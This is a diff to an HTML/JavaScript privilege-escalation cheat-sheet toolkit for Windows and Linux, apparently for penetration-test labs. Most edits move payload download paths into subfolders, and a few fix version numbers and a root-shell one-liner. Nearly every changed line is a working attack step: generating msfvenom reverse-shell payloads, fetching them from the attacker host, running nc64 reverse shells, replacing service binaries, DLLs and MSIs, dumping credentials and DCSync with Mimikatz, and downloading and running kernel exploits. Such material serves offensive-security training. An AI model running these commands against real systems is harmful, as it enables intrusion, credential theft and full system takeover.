@@ -1162,7 +1162,7 @@ dir "{{SVCBIN}}.bak"</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — replace binary and trigger</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer payload and replace service binary</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/shell.exe -Outfile {{WPATH}}\shell.exe
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/shell.exe -Outfile {{WPATH}}\shell.exe
 copy {{WPATH}}\shell.exe "{{SVCBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: restart the service (try in this order)</div>
 <pre class="cmd">Restart-Service -Name '&lt;ServiceName&gt;' -Force
@@ -1273,7 +1273,7 @@ Set <code style="color:var(--yellow)">SVCDIR</code> = service application direct
 <pre class="cmd"># On Kali — compile DLL payload:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o ~/privesc-toolkit/&lt;MissingDLL&gt;.dll
 # Then serve and pull onto target:
-iwr -uri http://{{KALI_IP}}:{{PORT}}/&lt;MissingDLL&gt;.dll -Outfile {{WPATH}}\&lt;MissingDLL&gt;.dll</pre></div>
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/&lt;MissingDLL&gt;.dll -Outfile {{WPATH}}\&lt;MissingDLL&gt;.dll</pre></div>
 
 <div class="pipeline">
 <div class="pipe-step pipe-detect">
@@ -1337,7 +1337,7 @@ copy "{{SVCDIR}}\&lt;MissingDLL&gt;.dll" "{{SVCDIR}}\&lt;MissingDLL&gt;.dll.bak"
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — drop DLL and trigger service</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer and place the malicious DLL</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/&lt;MissingDLL&gt;.dll -Outfile "{{WPATH}}\&lt;MissingDLL&gt;.dll"
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/&lt;MissingDLL&gt;.dll -Outfile "{{WPATH}}\&lt;MissingDLL&gt;.dll"
 copy "{{WPATH}}\&lt;MissingDLL&gt;.dll" "{{SVCDIR}}\&lt;MissingDLL&gt;.dll"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: restart service to load the DLL</div>
 <pre class="cmd">Restart-Service -Name '&lt;ServiceName&gt;' -Force
@@ -1379,7 +1379,7 @@ sc.exe start &lt;ServiceName&gt;</pre></div>
 <pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe -Outfile {{WPATH}}\accesschk.exe
 # Your malicious exe — generate on Kali first, then serve:
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o ~/privesc-toolkit/My.exe
-iwr -uri http://{{KALI_IP}}:{{PORT}}/My.exe -Outfile "C:\Program Files\My.exe"</pre></div>
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/My.exe -Outfile "C:\Program Files\My.exe"</pre></div>
 <div class="alts">
   <div class="alt-item"><span class="alt-arrow">&#8594;</span><code class="alt-cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/accesschk.exe {{WPATH}}\accesschk.exe</code> — CMD</div>
 </div>
@@ -1439,7 +1439,7 @@ copy "C:\Program Files\My.exe" "C:\Program Files\My.exe.bak"</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — drop payload at the truncated path</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer and drop at the writable truncated path location</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/My.exe -Outfile {{WPATH}}\My.exe
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/My.exe -Outfile {{WPATH}}\My.exe
 copy {{WPATH}}\My.exe "C:\Program Files\My.exe"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger service restart</div>
 <pre class="cmd">Restart-Service -Name '&lt;ServiceName&gt;' -Force
@@ -1524,7 +1524,7 @@ dir "{{TASKBIN}}.bak"</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">3. EXPLOIT — replace executable and wait/force trigger</span>
 <div class="cmd-wrap"><div class="cmd-label">Transfer payload and replace task binary</div>
-<pre class="cmd">iwr -Uri http://{{KALI_IP}}:{{PORT}}/shell.exe -Outfile {{WPATH}}\shell.exe
+<pre class="cmd">iwr -Uri http://{{KALI_IP}}:{{PORT}}/windows/shell.exe -Outfile {{WPATH}}\shell.exe
 copy {{WPATH}}\shell.exe "{{TASKBIN}}"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Trigger: force run the task now (requires task write perms)</div>
 <pre class="cmd">schtasks /run /tn "&lt;TaskName&gt;"
@@ -1844,7 +1844,7 @@ reg save hklm\system {{WPATH}}\system.bak</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">2. EXPLOIT — transfer and install MSI as SYSTEM</span>
 <div class="cmd-wrap"><div class="cmd-label">Download and silently install (runs as SYSTEM due to policy)</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/evil.msi -Outfile {{WPATH}}\evil.msi
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/evil.msi -Outfile {{WPATH}}\evil.msi
 msiexec /qn /i {{WPATH}}\evil.msi</pre></div>
 </div>
 <div class="pipe-step pipe-verify">
@@ -2291,9 +2291,9 @@ tasklist /fi "IMAGENAME eq lsass.exe"</pre></div>
 <div class="pipe-step pipe-exploit">
 <span class="pipe-step-label">5. PLACE the DLL on the target</span>
 <div class="cmd-wrap"><div class="cmd-label">For PrintConfig.dll path</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</pre></div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/PrintConfig.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">For tzres.dll path</div>
-<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</pre></div>
+<pre class="cmd">iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"</pre></div>
 </div>
 
 <div class="pipe-step pipe-verify">
@@ -2403,7 +2403,7 @@ ren Utilman.old Utilman.exe
 {{WPATH}}\SeRestoreAbuse.exe "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e powershell.exe"</pre></div>
 <div class="cmd-wrap"><div class="cmd-label">Option 2b: msfvenom payload via SeRestoreAbuse</div>
 <pre class="cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o ~/privesc-toolkit/payload.exe
-iwr -uri http://{{KALI_IP}}:{{PORT}}/payload.exe -Outfile {{WPATH}}\payload.exe
+iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/payload.exe -Outfile {{WPATH}}\payload.exe
 {{WPATH}}\SeRestoreAbuse.exe {{WPATH}}\payload.exe</pre></div>
 </div>
 
@@ -3357,7 +3357,7 @@ sudo umount /mnt/smb</pre></div>
 <div class="cmd-wrap"><pre class="cmd">certutil -urlcache -split -f http://{{KALI_IP}}:{{PORT}}/windows/x64/mimikatz.exe {{WPATH}}\mimi.exe</pre></div>
 <div class="cmd-label">EXTRACT all credentials</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "vault::cred" "lsadump::sam" exit</pre></div>
-<div class="cmd-label">SAM dump (offline)</div>
+<div class="cmd-label">SAM dump (online — live registry, requires SYSTEM/admin)</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "lsadump::sam" exit</pre></div>
 <div class="cmd-label">NTDS / DCSync</div>
 <div class="cmd-wrap"><pre class="cmd">{{WPATH}}\mimi.exe "privilege::debug" "lsadump::dcsync /domain:{{DOMAIN}} /all /csv" exit</pre></div>
@@ -4883,7 +4883,7 @@ find / -perm -u=s -type f 2>/dev/null | xargs ls -la 2>/dev/null | awk '{print $
 # Dangerous output to look for: cap_setuid, cap_dac_override, cap_sys_admin
 # Example: /usr/bin/python3 = cap_setuid+ep
 # Exploit cap_setuid immediately:
-# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'</pre></div>
+# python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'</pre></div>
 <div class="notes-toggle" onclick="toggleNotes('lin-suid2')">&#128221; Notes</div>
 <textarea class="notes-area" id="notes-lin-suid2" onchange="saveNote('lin-suid2',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
@@ -5328,7 +5328,7 @@ cd lxd-alpine-builder && sudo bash build-alpine
     <pre class="cmd">python3 -m http.server {{PORT}}</pre>
   </div>
   <div class="pipe-step pipe-exploit"><div class="pipe-step-label">TARGET — import &amp; launch</div>
-    <pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/alpine-v3.x-x86_64.tar.gz
+    <pre class="cmd">wget http://{{KALI_IP}}:{{PORT}}/linux/alpine-v3.x-x86_64.tar.gz
 lxc image import alpine-v3.x-x86_64.tar.gz --alias alpine
 lxc image list</pre>
     <pre class="cmd">lxc init alpine privesc -c security.privileged=true
@@ -5398,27 +5398,27 @@ ls -la /bin/bash  # should be -rwxr-xr-x (no s bit)</pre>
 <textarea class="notes-area" id="notes-lin-chkrootkit" onchange="saveNote('lin-chkrootkit',this.value)" placeholder="Add your notes here..."></textarea>
 </section>
 
-<!-- ── SCREEN 4.5.00 CVE ───────────────────────────────────────── -->
+<!-- ── SCREEN 4.05.00 CVE ───────────────────────────────────────── -->
 <section class="section" id="lin-screen-cve">
 <div class="section-header">
-  <div><div class="section-num">+</div><div class="section-title">GNU screen 4.5.00 — CVE-2017-5618 (SUID exploit)</div>
+  <div><div class="section-num">+</div><div class="section-title">GNU screen 4.05.00 — CVE-2017-5618 (SUID exploit)</div>
   <div class="section-subtitle">Abuses SUID screen binary's log feature to write a root shell</div></div>
   <div class="badges"><span class="badge badge-exploit">EXPLOIT</span><span class="badge badge-privesc">PRIVESC</span></div>
 </div>
-<div class="callout callout-warn"><strong>⚠️ Requires screen 4.5.00 with SUID bit</strong>: <code>screen --version &amp;&amp; ls -la $(which screen)</code></div>
+<div class="callout callout-warn"><strong>⚠️ Requires screen 4.05.00 with SUID bit</strong>: <code>screen --version &amp;&amp; ls -la $(which screen)</code></div>
 <div class="pipeline">
   <div class="pipe-step pipe-detect"><div class="pipe-step-label">DETECT</div>
     <pre class="cmd">screen --version
 ls -la $(which screen)
 find / -perm -4000 -name screen 2>/dev/null</pre>
-    <pre class="cmd"># One-liner: confirm BOTH required conditions (version 4.5.00 AND SUID bit) together:
+    <pre class="cmd"># One-liner: confirm BOTH required conditions (version 4.05.00 AND SUID bit) together:
 screen_path=$(which screen 2>/dev/null || find / -perm -4000 -name screen 2>/dev/null | head -1)
 [ -n "$screen_path" ] && {
   ver=$(screen --version 2>&1 | awk '{print $3}')
   perm=$(ls -la "$screen_path" 2>/dev/null | awk '{print $1}')
   echo "Version: $ver | Perms: $perm"
-  echo "$ver" | grep -q "4.5.00" && echo "$perm" | grep -q "s" \
-    && echo "[+] EXPLOITABLE: screen 4.5.00 with SUID confirmed"
+  echo "$ver" | grep -q "4.05.00" && echo "$perm" | grep -q "s" \
+    && echo "[+] EXPLOITABLE: screen 4.05.00 with SUID confirmed"
 }
 # Confirm gcc is available for compiling payloads:
 which gcc 2>/dev/null && echo "[+] gcc available" \
@@ -7205,9 +7205,9 @@ const LIN_VULNS = [
    check:'Vulnerable: 5.8.0 ≤ kernel &lt; 5.16.11 / &lt; 5.15.25 / &lt; 5.10.102. Confirm with: uname -r',
    dl:'wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.sh && chmod +x exploit-1.sh && ./exploit-1.sh',
    link:'https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits'},
-  {name:'DirtyCow',cve:'CVE-2016-5195',minK:[2,6,22],maxK:[4,8,2],sev:'h',section:'lin-kernel',
+  {name:'DirtyCow',cve:'CVE-2016-5195',minK:[2,6,22],maxK:[4,8,3],sev:'h',section:'lin-kernel',
    desc:'Race condition in CoW — write to read-only mmap. Stable PoC: dirtycow.ninja',
-   check:'Vulnerable: 2.6.22 – 4.8.2. Confirm with: uname -r',
+   check:'Vulnerable: 2.6.22 – 4.8.3. Confirm with: uname -r',
    dl:'wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c && gcc -pthread dirty.c -o dirty -lcrypt && ./dirty',
    link:'https://github.com/firefart/dirtycow'},
   {name:'PwnKit (polkit)',cve:'CVE-2021-4034',minK:[0,0,0],maxK:[99,99,99],sev:'c',section:'lin-kernel',
@@ -7366,9 +7366,9 @@ const PRIV_EXPLOITS = {
     tools:[
       {name:'SeManageVolumeExploit.exe', note:'Self-enables + grants C:\\ full perms instantly', cmd:'{{WPATH}}\\SeManageVolumeExploit.exe', link:'https://github.com/CsEnox/SeManageVolumeExploit'},
       {name:'msfvenom (Kali)', note:'Generate malicious PrintConfig.dll', cmd:'msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o PrintConfig.dll', link:''},
-      {name:'iwr upload DLL', note:'Place at exact DLL path', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"', link:''},
+      {name:'iwr upload DLL', note:'Place at exact DLL path', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/windows/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"', link:''},
       {name:'PrintNotify CLSID trigger', note:'Trigger after DLL placed — spawns SYSTEM process', cmd:'$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)', link:''},
-      {name:'tzres.dll alt trigger', note:'Alternative — place tzres.dll → run systeminfo', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo', link:''},
+      {name:'tzres.dll alt trigger', note:'Alternative — place tzres.dll → run systeminfo', cmd:'iwr http://{{KALI_IP}}:{{PORT}}/windows/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo', link:''},
     ],
     steps:[
       '# Kali: generate payload DLL',
@@ -7376,12 +7376,12 @@ const PRIV_EXPLOITS = {
       '# Target: run exploit (self-enables even if Disabled)',
       '{{WPATH}}\\SeManageVolumeExploit.exe',
       '# Target: upload DLL to exact path',
-      'iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"',
+      'iwr http://{{KALI_IP}}:{{PORT}}/windows/PrintConfig.dll -OutFile "C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll"',
       '# Kali: start listener',
       'nc -lvnp {{RPORT}}',
       '# Target: trigger PrintNotify CLSID',
       '$type=[Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}"); [Activator]::CreateInstance($type)',
-      '# ALT trigger: iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo'],
+      '# ALT trigger: iwr http://{{KALI_IP}}:{{PORT}}/windows/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"; systeminfo'],
     warning:'DLL path must be exactly: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\PrintConfig.dll — even one character off fails. svc_mssql and similar service accounts commonly hold this. Exploit works even when priv shows as DISABLED.',
     detect:'whoami /priv | findstr SeManageVolume'
   },
@@ -8319,7 +8319,7 @@ const DT = {
     managevol: {q:'SeManageVolumePrivilege → write tzres.dll to wbem → trigger via systeminfo',final:true,s:'win-exploits',
       cmds:['{{WPATH}}\\SeManageVolumeExploit.exe',
             '# Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll',
-            'iwr -uri http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"',
+            'iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/tzres.dll -OutFile "C:\\Windows\\System32\\wbem\\tzres.dll"',
             'systeminfo  # trigger DLL load → reverse shell fires']},
     restore: {q:'SeRestorePrivilege → SeRestoreAbuse.exe (clean) or utilman swap',final:true,s:'win-exploits',
       cmds:['{{WPATH}}\\SeRestoreAbuse.exe "{{WPATH}}\\nc64.exe {{KALI_IP}} {{RPORT}} -e powershell.exe"',
@@ -8355,7 +8355,7 @@ const DT = {
       cmds:['reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
             'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
             '# Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f msi -o evil.msi',
-            'iwr -uri http://{{KALI_IP}}:{{PORT}}/evil.msi -Outfile {{WPATH}}\\evil.msi',
+            'iwr -uri http://{{KALI_IP}}:{{PORT}}/windows/evil.msi -Outfile {{WPATH}}\\evil.msi',
             'msiexec /qn /i {{WPATH}}\\evil.msi']},
     regdacl: {q:'Weak registry DACL → overwrite ImagePath with payload',final:true,s:'win-regdacl',
       cmds:['# Confirm writable (PS): (Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<Svc>).Access',
